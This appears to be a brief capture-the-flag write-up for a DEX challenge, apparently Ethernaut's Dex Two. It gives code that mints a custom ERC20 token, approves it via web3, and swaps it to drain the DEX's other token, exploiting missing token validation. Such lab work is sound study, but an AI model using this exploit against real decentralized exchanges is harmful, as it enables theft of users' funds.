## Description
```
contract MyToken is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
    }
    
}
```
Send 100 tokens to DexTwo
```
const abi = [
{
"inputs": [
{
"internalType": "address",
"name": "spender",
"type": "address"
},
{
"internalType": "uint256",
"name": "value",
"type": "uint256"
}
],
"name": "approve",
"outputs": [
{
"internalType": "bool",
"name": "",
"type": "bool"
}
],
"stateMutability": "nonpayable",
"type": "function"
}
];

contract2 = new web3.eth.Contract(abi, "0x65951412AFE1a20f68AB228DE738fCeF7DfeDbAA");
contract2.methods.approve(contract.address, 100).send({
from: player
})
```
And then swap
```
await contract.swap("0x65951412AFE1a20f68AB228DE738fCeF7DfeDbAA","0x142d7Dd2d3D073a2B506A3eF1DdD28F46aA4739E",100)
```